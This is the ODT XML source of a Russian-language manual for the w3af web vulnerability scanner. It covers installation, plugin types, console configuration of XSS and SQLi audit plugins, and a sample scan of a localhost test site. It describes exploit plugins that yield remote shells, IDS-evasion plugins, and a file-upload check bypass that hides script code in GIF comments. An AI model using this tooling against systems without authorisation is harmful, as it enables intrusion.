        <text:p text:style-name="P25"><text:span text:style-name="T20">Фреймворк должен работать на любой платформе которая поддерживает Python. Работоспособность w3af была протестирована на Linux, Windows XP, Windows Vista и OpenBSD. Это руководство содержит пример установки на </text:span><text:span text:style-name="T20">Linux</text:span><text:span text:style-name="T20">-платформу который применим к остальным *</text:span><text:span text:style-name="T20">nix</text:span><text:span text:style-name="T20">-системам. Установить w3af на </text:span><text:span text:style-name="T20">Windows</text:span><text:span text:style-name="T20">-системы вы можете с помощью готового установочного файла (находится на нашем сайте).</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="Heading_20_1">Системные требования</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Для запуска </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> требуются следующие пакеты, которые можно условно поделить на 2 группы:</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T21">● Пакеты, которые необходимы для функционирования ядра</text:span><text:span text:style-name="T20">:</text:span></text:p>
        <text:list xml:id="list1957392627" text:style-name="WW8Num2">
          <text:list-item>
            <text:p text:style-name="P26"><text:span text:style-name="T20">Python </text:span><text:span text:style-name="T22">2.5</text:span></text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P12">fpconst-0.7.2</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P12">pygoogle</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P12">nltk</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P12">SOAPpy</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P12">pyPdf</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P12">Beautiful Soup</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P12">Python OpenSSL</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P12">json.py</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P12">scapy</text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P25"><text:span text:style-name="T21">● Пакеты, необходимые для работы с графическим интерфейсом</text:span><text:span text:style-name="T20">:</text:span></text:p>
        <text:list xml:id="list1264917903" text:style-name="WW8Num3">
          <text:list-item>
            <text:p text:style-name="P13"><text:soft-page-break/>python sqlite3</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P13">graphviz</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P13">pygtk 2.0</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P13">gtk 2.12</text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">Как вы наверное уже догадались, библиотеки из первой категории нужны для запуска w3af, вне зависимости от выбранного интерфейса, а требования второй группы обязательны только если вы собрались использовать графический интерфейс.</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Некоторые библиотеки поставляются сразу с дистрибутивом для того чтобы упростить установку. Их вы можете найти в директории </text:span><text:span text:style-name="T20">extlib</text:span><text:span text:style-name="T20">. Большинство библиотек могут быть установлены прямо отсюда, но возможен вариант когда в процессе установки вас попросят установить какие-то дополнительные пакеты. Вот пошаговое описание установки библиотек (она должна производиться под пользователем </text:span><text:span text:style-name="T20">root</text:span><text:span text:style-name="T20">)</text:span></text:p>
        <text:p text:style-name="P32"/>
        <text:p text:style-name="P34">cd w3af</text:p>
        <text:p text:style-name="P34">cd extlib</text:p>
        <text:p text:style-name="P34">cd fpconst0.7.2</text:p>
        <text:p text:style-name="P34">python setup.py install</text:p>
        <text:p text:style-name="P34">cd ..</text:p>
        <text:p text:style-name="P34">cd pygoogle</text:p>
        <text:p text:style-name="P34">python setup.py install</text:p>
        <text:p text:style-name="P34">cd ..</text:p>
        <text:p text:style-name="P34">cd SOAPpy</text:p>
        <text:p text:style-name="P34">python setup.py install</text:p>
        <text:p text:style-name="P34">cd pyPdf</text:p>
        <text:p text:style-name="P34">python setup.py install</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="Heading_20_1">Фазы работы w3af </text:p>
        <text:p text:style-name="P11">Перед запуском w3af пользователь должен знать какие фазы работы существуют в приложении и как работают плагины. В w3af сущетсвуют 3 основные типы плагинов: для исследований, для аудита и для проведения атак. </text:p>
        <text:p text:style-name="P11">Исследовательские плагины ответственны за поиск новых ссылок, форм и других</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">мест через которые могут быть проведены инъекционные атаки. Классический пример исследовательского плагина это </text:span><text:span text:style-name="T20">webSpider</text:span><text:span text:style-name="T20">. Он находит ссылки в теле страниц, и показывает какие места в них могут быть использованы для инъекционных атак.</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Когда пользователь активирует один или более плагинов такого типа, то они работают по кругу: если плагин А находит новый </text:span><text:span text:style-name="T20">URL</text:span><text:span text:style-name="T20"> то ядро </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> посылает этот адрес плагину Б. Если плагин Б находит новый </text:span><text:span text:style-name="T20">URL</text:span><text:span text:style-name="T20"> то он посылается плагину А. Этот процесс будет происходить пока каждая ссылка не будет обработана всеми плагинами. </text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Плагины для аудита берут «точки возможных инъекций» в ссылках полученных исследовательскими плагинами, и производят запросы по ним со специально сформированными данными пытаясь выявить возможные уязвимости. <text:s/>Классическим примером является плагин для поиска </text:span><text:span text:style-name="T20">SQL</text:span><text:span text:style-name="T20">-инъекций.</text:span></text:p>
        <text:p text:style-name="P11">Плагины проведения атак берут на себя задачу эксплуатации уязвимости. Они обычно возвращают командную строку на удалённом сервере или дамп таблиц.</text:p>
        <text:p text:style-name="P11"><text:soft-page-break/></text:p>
        <text:p text:style-name="Heading_20_1">Запуск w3af</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">w3af имеет 2 пользовательских интерфейса - консольный интерфейс (consoleUI) и графический (gtkUi). Это руководство описывает работу с консольной версией интерфейса, потому что она больше тестировалась и отлаживалась, чем графическая. Для вызова консольного интерфейса нужно запустить <text:s/>соответствующий <text:s/>исполняемый файл </text:span><text:span text:style-name="T20">w</text:span><text:span text:style-name="T20">3</text:span><text:span text:style-name="T20">af</text:span><text:span text:style-name="T20"> без параметров:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">./w3af_console</text:span></text:p>
        <text:p text:style-name="P33">w3af&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P16"/>
        <text:p text:style-name="P11">Из этой строки вы можете конфигурировать фреймворк, запускать сканирование и эксплойты для уязвимостей. Для этого имеется специальный набор команд. Первая команда, которую Вам нужно запомнить - “help” (так же после неё может быть указана конкретная команда или параметр):</text:p>
        <text:p text:style-name="P17"/>
        <text:p text:style-name="P17"/>
        <text:p text:style-name="P17"><draw:frame draw:style-name="fr1" draw:name="graphics1" text:anchor-type="char" svg:x="0in" svg:y="0.0583in" svg:width="6.6909in" svg:height="2.9717in" draw:z-index="0"><draw:image xlink:href="Pictures/20000007000057C6000026FFB2583F20.wmf" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T24">Для каждой команды имеется подробное описание</text:span><text:span text:style-name="T20">. Команда «</text:span><text:span text:style-name="T20">help</text:span><text:span text:style-name="T20">» может принимать в качестве параметра другую команду, как это показано на скриншоте. Интересной особенностью является автодополнение команд в консоли (например наберите «</text:span><text:span text:style-name="T20">plu</text:span><text:span text:style-name="T20">» и нажмите </text:span><text:span text:style-name="T20">TAB</text:span><text:span text:style-name="T20">) и история команд (после написания вами разных команд вы можете перемещаться по ним с помощью стрелок вверх и вниз). </text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Для того чтобы зайти в управление какой-либо конфигурации вы должны набрать её имя и нажать </text:span><text:span text:style-name="T20">Enter</text:span><text:span text:style-name="T24">. После этого командная строка изменится соответствующим образом:</text:span></text:p>
        <text:p text:style-name="P17"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt;</text:span><text:span text:style-name="T24">http-settings</text:span></text:p>
        <text:p text:style-name="P33">w3af/config:http-settings&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P16"/>
        <text:p text:style-name="P11">Управление каждой настройкой осуществляется следующими командами:</text:p>
        <text:list xml:id="list1988187117" text:style-name="WW8Num4">
          <text:list-item>
            <text:p text:style-name="P14">help</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P14">view</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P14"><text:soft-page-break/>set</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P14">back</text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P11">Вот пример их использования с опцией http-settings:</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11"><draw:frame draw:style-name="fr2" draw:name="graphics2" text:anchor-type="char" svg:y="0in" svg:width="6.6909in" svg:height="1.398in" draw:z-index="1"><draw:image xlink:href="Pictures/20000007000057A200001254F7CA5F0A.wmf" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
        <text:p text:style-name="P11"><draw:frame draw:style-name="fr2" draw:name="graphics3" text:anchor-type="char" svg:y="0in" svg:width="6.6909in" svg:height="4.8728in" draw:z-index="2"><draw:image xlink:href="Pictures/200000070000564200003ED5082EDF5D.wmf" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T23">w3af/config:httpsettings&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set timeout 5</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T23">w3af/config:httpsettings&gt;&gt;&gt; </text:span><text:span text:style-name="T24">view</text:span></text:p>
        <text:p text:style-name="P17"/>
        <text:p text:style-name="P17"><draw:frame draw:style-name="fr2" draw:name="graphics4" text:anchor-type="char" svg:y="0in" svg:width="6.6909in" svg:height="0.5189in" draw:z-index="3"><draw:image xlink:href="Pictures/20000007000056CF000006C11EDF5316.wmf" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Вообщем, команда «</text:span><text:span text:style-name="T20">view</text:span><text:span text:style-name="T20">» служит для просмотра списка всех конфигурационных параметров с их описанием и значением. Команда «</text:span><text:span text:style-name="T20">set</text:span><text:span text:style-name="T20">» используется для изменения значений параметров. Так же вы можете использовать команды «</text:span><text:span text:style-name="T20">back</text:span><text:span text:style-name="T20">», «.» (у меня эта команда не срабатывала — п.п.) и комбинацию клавиш </text:span><text:span text:style-name="T20">CTRL</text:span><text:span text:style-name="T20">+</text:span><text:span text:style-name="T20">C</text:span><text:span text:style-name="T20"> для того чтобы вернуться в предыдущее меню. Детальное описание для каждого из </text:span><text:soft-page-break/><text:span text:style-name="T20">конфигурационных параметров может быть получено с использованием команды «</text:span><text:span text:style-name="T20">help</text:span><text:span text:style-name="T20">», как показано в примере:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P33">w3af/config:httpsettings&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P34">help timeout</text:p>
        <text:p text:style-name="P34">Help for parameter timeout:</text:p>
        <text:p text:style-name="P34">===========================</text:p>
        <text:p text:style-name="P34">Set low timeouts for LAN use and high timeouts for slow Internet</text:p>
        <text:p text:style-name="P34">connections.</text:p>
        <text:p text:style-name="P33">w3af/config:httpsettings&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P16"/>
        <text:p text:style-name="P11">Меню “http-settings” и “misc-settings” используются для указания фреймворку глобальных настроек. Каждый параметр имеет значение по умолчанию, и в большинстве случаев вы можете оставить всё без изменений. w3af был спроектирован так чтобы позволить новичкам пользоваться данным инструментом вне зависимости от знаний его внутреннего устройства. Зато настройки могут достаточно гибко изменятся экспертами которые знают что они хотят и могут поменять параметры чётко под свои задачи.</text:p>
        <text:p text:style-name="P17"/>
        <text:p text:style-name="Heading_20_1">Запуск w3af с GTK-интерфейсом</text:p>
        <text:p text:style-name="P11">Фреймворк помимо консольного интерфейса имеет ещё и графический. Открыть его вы можете запустив соответствующий исполняемый файл:</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">./w3af_gui</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">Графический интерфейс позволяет управлять действиями (например сканированием) и настройками фреймворка очень легко и быстро. Вот как он выглядит.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11"><text:soft-page-break/><draw:frame draw:style-name="fr2" draw:name="graphics5" text:anchor-type="char" svg:y="0in" svg:width="6.6909in" svg:height="4.3945in" draw:z-index="4"><draw:image xlink:href="Pictures/2000000700005BF900003C6A12DB6067.wmf" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
        <text:p text:style-name="P7"/>
        <text:p text:style-name="Heading_20_1">Плагины</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Плагины ищут ссылки, обнаружают уязвимости и т.д — вообщем выполняют всю основную работу. Сейчас мы научимся их настраивать. Во-первых, как уже было сказано, w3af имеет 3 основных типа плагинов: для исследований, аудита и эксплуатации уязвимостей. <text:s/>Вот полный лист категорий (включая и 3 основные):</text:span></text:p>
        <text:list xml:id="list962301455" text:style-name="WW8Num5">
          <text:list-item>
            <text:p text:style-name="P15">discovery</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P15">audit</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P15">grep</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P15">exploit</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P15">output</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P15">mangle</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P15">bruteforce</text:p>
          </text:list-item>
          <text:list-item>
            <text:p text:style-name="P15">evasion</text:p>
          </text:list-item>
        </text:list>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Первый вид плагинов находит места для возможных инъекций. Они позже передаются audit-плагинам для поиска уязвимостей. Grep-плагины анализируют содержимое всех страниц и ищут в нём что-либо подозрительное. Например grep-плагин ищет комментарии со словом «password» в коде страниц. Плагины для эксплуатации уязвимостей (exploit) используют ранее найденные уязвимости и пытаются дать пользователю что-нибудь полезное (удалённый шелл, SQL-дамп и т.д.). </text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Output-плагины осуществляют связь между фреймворком и пользователем. Они сохраняют полученные данные в виде отчётов в текстовый или </text:span><text:span text:style-name="T20">html</text:span><text:span text:style-name="T20">-файл. Отладочная информация так же передаётся этим плагинам и может быть в будущем </text:span><text:soft-page-break/><text:span text:style-name="T20">использована для анализа.</text:span></text:p>
        <text:p text:style-name="P11">Mangle-плагины позволяют модифицировать запросы к серверу и ответы от него с помощью регулярных выражений.</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Bruteforce-плагины занимаются подбором паролей. Они запускаются на фазе исследования (работы </text:span><text:span text:style-name="T20">discovery</text:span><text:span text:style-name="T20">-плагинов)</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Ну и наконец evasion-плагины. Они нужны для избежания обнаружения сканирования (скрытие от IDS и т.д.).</text:span></text:p>
        <text:p text:style-name="Heading_20_1">Настройка плагинов</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Плагины можно настроить в соответствующем разделе. Используйте для этого команду «</text:span><text:span text:style-name="T20">plugins</text:span><text:span text:style-name="T20">» в главном меню.</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11"><draw:frame draw:style-name="fr2" draw:name="graphics6" text:anchor-type="char" svg:y="0in" svg:width="6.6909in" svg:height="2.3102in" draw:z-index="5"><draw:image xlink:href="Pictures/200000070000575C00001E2DECC369F0.wmf" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Все плагины могут быть настроены здесь, за исключением оных из exploit-группы. Вот примеры того как можно узнать синтаксис для любого из них:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt;</text:span><text:span text:style-name="T23"> </text:span><text:span text:style-name="T24">help audit</text:span></text:p>
        <text:p text:style-name="P34">View, configure and enable audit plugins</text:p>
        <text:p text:style-name="P34">Syntax: audit [config plugin | plugin1[,plugin2 ... pluginN] | desc plugin]</text:p>
        <text:p text:style-name="P34">Example: audit</text:p>
        <text:p text:style-name="P34">Result: All enabled audit plugins are listed.</text:p>
        <text:p text:style-name="P34"/>
        <text:p text:style-name="P34">Example2: audit LDAPi,blindSqli</text:p>
        <text:p text:style-name="P34">Result: LDAPi and blindSqli are configured to run</text:p>
        <text:p text:style-name="P34"/>
        <text:p text:style-name="P34">Example3: audit config LDAPi</text:p>
        <text:p text:style-name="P34">Result: Enters to the plugin configuration menu.</text:p>
        <text:p text:style-name="P34"/>
        <text:p text:style-name="P34">Example4: audit all,!blindSqli</text:p>
        <text:p text:style-name="P34">Result: All audit plugins are configured to run except</text:p>
        <text:p text:style-name="P34">blindSqli.</text:p>
        <text:p text:style-name="P34"/>
        <text:p text:style-name="P34">Example1: audit desc LDAPi</text:p>
        <text:p text:style-name="P34">Result: You will get the plugin description</text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">help list</text:span></text:p>
        <text:p text:style-name="P34">List available plugins.</text:p>
        <text:p text:style-name="P34">Syntax: list {plugin type} [all | enabled | disabled]</text:p>
        <text:p text:style-name="P34">By default all plugins are listed.</text:p>
        <text:p text:style-name="P33"><text:soft-page-break/>w3af/plugins&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Нижеприведённый пример демонстрирует использование команды для того чтобы увидеть доступные </text:span><text:span text:style-name="T20">audit</text:span><text:span text:style-name="T20">-плагины и их статус.</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11"><draw:frame draw:style-name="fr2" draw:name="graphics7" text:anchor-type="char" svg:y="0in" svg:width="6.6909in" svg:height="6.3598in" draw:z-index="6"><draw:image xlink:href="Pictures/20000007000056650000521FE34F680A.wmf" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
        <text:p text:style-name="P11">Для активации плагинов «xss» и «sqli», и проверки того что фреймворк правильно понял нас, можно использовать следующий набор команд</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">audit xss, sqli</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">audit</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">В появившемся списке вы можете увидеть то что нужные нам плагины теперь активны.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">А если пользователю интересно что делает тот или иной плагин то он может использовать команду «</text:span><text:span text:style-name="T20">desc</text:span><text:span text:style-name="T20">».</text:span></text:p>
        <text:p text:style-name="P11"><text:soft-page-break/></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">plugins</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">audit desc fileUpload</text:span></text:p>
        <text:p text:style-name="P34">This plugin will try to expoit insecure file upload forms.</text:p>
        <text:p text:style-name="P34">One configurable parameter exists:</text:p>
        <text:p text:style-name="P36">- extensions</text:p>
        <text:p text:style-name="P34">The extensions parameter is a comma separated list of extensions</text:p>
        <text:p text:style-name="P34">that this plugin will try to upload. Many web applications</text:p>
        <text:p text:style-name="P34">verify the extension of the file being uploaded, if special</text:p>
        <text:p text:style-name="P34">extensions are required, they can be added here.</text:p>
        <text:p text:style-name="P34">Some web applications check the contents of the files being</text:p>
        <text:p text:style-name="P34">uploaded to see if they are really what their extension</text:p>
        <text:p text:style-name="P34">is telling. To bypass this check, this plugin uses file</text:p>
        <text:p text:style-name="P34">templates located at "plugins/audit/fileUpload/", this templates</text:p>
        <text:p text:style-name="P34">are valid files for each extension that have a section ( the</text:p>
        <text:p text:style-name="P34">comment field in a gif file for example ) that can be replaced</text:p>
        <text:p text:style-name="P34">by scripting code ( PHP, ASP, etc ).</text:p>
        <text:p text:style-name="P34">After uploading the file, this plugin will try to find it on</text:p>
        <text:p text:style-name="P34">common directories like "upload" and "files" on every know</text:p>
        <text:p text:style-name="P34">directory. If the file is found, a vulnerability exists.</text:p>
        <text:p text:style-name="P33">w3af/plugins&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">Теперь мы можем узнать что делает плагин, но давайте проверим его настройки:</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11"><draw:frame draw:style-name="fr2" draw:name="graphics8" text:anchor-type="char" svg:y="0in" svg:width="6.6909in" svg:height="2.7654in" draw:z-index="7"><draw:image xlink:href="Pictures/20000007000057A20000243D4866C93D.wmf" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></draw:frame></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Конфигурационное меню у плагинов всегда имеет команду «</text:span><text:span text:style-name="T20">set</text:span><text:span text:style-name="T20">» для изменения значений и команду «</text:span><text:span text:style-name="T20">view</text:span><text:span text:style-name="T20">» выводящую список существующих опций. В предыдущем примере мы отключили одну из проверок в </text:span><text:span text:style-name="T20">xss</text:span><text:span text:style-name="T20">-плагине и посмотрели список опций <text:s/></text:span><text:span text:style-name="T20">sqli</text:span><text:span text:style-name="T20">-плагина который на данный момент не имеет параметров.</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="Heading_20_1">Начало сканирования</text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">После настройки всех необходимых плагинов пользователь должен указать целевой </text:span><text:span text:style-name="T20">URL</text:span><text:span text:style-name="T20"> и начать сканирование. Указание цели происходит следующим путём:</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:soft-page-break/><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">target</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/config:target&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set target http://localhost/</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/config:target&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P33">w3af&gt;&gt;&gt;</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P11">В конце нужно выполнить команду “start”. </text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">start</text:span></text:p>
        <text:p text:style-name="P34"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Время от времени вы можете нажимать </text:span><text:span text:style-name="T20">Enter</text:span><text:span text:style-name="T20"> для того чтобы видеть текущую информацию о ходе сканирования.</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P34">Status: Running discovery.webSpider on http://localhost/w3af/ |</text:p>
        <text:p text:style-name="P34">Method: GET.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="Heading_20_1">Полная сессия работы</text:p>
        <text:p text:style-name="P11">Рассмотрим пример работы с w3af от начала и до конца. Обратите внимание на вставленные коментарии так как они содержат дополнительную информацию.</text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">$ </text:span><text:span text:style-name="T24">./w3af</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">plug ins</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plug ins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">output console,text File</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">output config textFile</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:textFile&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set fileName output-w3af.txt</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:textFile&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set verbose True</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af</text:span><text:span text:style-name="T23">/plugins/output/config:textFile&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">output config console</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:console&gt;&gt;&gt; </text:span><text:span text:style-name="T24">set verbose False</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins/output/config:console&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">Все предыдущие команды активировали два </text:span><text:span text:style-name="T20">output</text:span><text:span text:style-name="T20">-плагина - «console» и «textFile»,</text:span></text:p>
        <text:p text:style-name="P25"><text:span text:style-name="T20">и</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">настроили</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">их</text:span><text:span text:style-name="T20">. </text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">discovery allowedMethods,webSpider</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/plugins&gt;&gt;&gt; </text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P11"/>
        <text:p text:style-name="P25"><text:span text:style-name="T20">В этом случае мы будем запускать только </text:span><text:span text:style-name="T20">discovery</text:span><text:span text:style-name="T20">-плагины. А</text:span><text:span text:style-name="T20"> </text:span><text:span text:style-name="T20">именно</text:span><text:span text:style-name="T20"> — «allowedMethods» </text:span><text:span text:style-name="T20">и</text:span><text:span text:style-name="T20"> «webSpider»</text:span><text:span text:style-name="T26">.</text:span></text:p>
        <text:p text:style-name="P18"/>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">target</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/target&gt;&gt;&gt;</text:span><text:span text:style-name="T24">set target http://localhost/w3af/</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af/target&gt;&gt;&gt;</text:span><text:span text:style-name="T24">back</text:span></text:p>
        <text:p text:style-name="P31"><text:span text:style-name="T23">w3af&gt;&gt;&gt; </text:span><text:span text:style-name="T24">start</text:span></text:p>
        <text:p text:style-name="P34">New URL found by discovery:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/responseSplitting/responseSplitting.php</text:p>
        <text:p text:style-name="P34">New URL found by discovery:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/blindSqli/blindSqlistr.php</text:p>
        <text:p text:style-name="P34">New URL found by discovery:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/webSpider/2.html</text:p>
        <text:p text:style-name="P34"><text:soft-page-break/>...</text:p>
        <text:p text:style-name="P34">...</text:p>
        <text:p text:style-name="P34">The URL: http://localhost/beef/hook/ has DAV methods enabled:</text:p>
        <text:p text:style-name="P34">OPTIONS</text:p>
        <text:p text:style-name="P34">GET</text:p>
        <text:p text:style-name="P34">HEAD</text:p>
        <text:p text:style-name="P34">POST</text:p>
        <text:p text:style-name="P34">TRACE</text:p>
        <text:p text:style-name="P34">PROPFIND</text:p>
        <text:p text:style-name="P34">PROPPATCH</text:p>
        <text:p text:style-name="P34">COPY</text:p>
        <text:p text:style-name="P34">MOVE</text:p>
        <text:p text:style-name="P34">LOCK</text:p>
        <text:p text:style-name="P34">UNLOCK</text:p>
        <text:p text:style-name="P34">DELETE</text:p>
        <text:p text:style-name="P34">( is possibly enabled too, not tested for safety )</text:p>
        <text:p text:style-name="P34">New URL found by discovery:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/globalRedirect/wargame/</text:p>
        <text:p text:style-name="P34">New URL found by discovery:</text:p>
        <text:p text:style-name="P34">http://localhost/w3af/globalRedirect/w3afsite.tgz </text:p>
        <text:p text:style-name="P34"/>
        <text:p text:style-name="P11">После фазы исследования пользователь получил следующие данные:</text:p>
        <text:p text:style-name="P17">Список полученных URL:</text:p>
        <text:p text:style-name="P17">- http://localhost/w3af/globalRedirect/w3af.testsite.tgz</text:p>
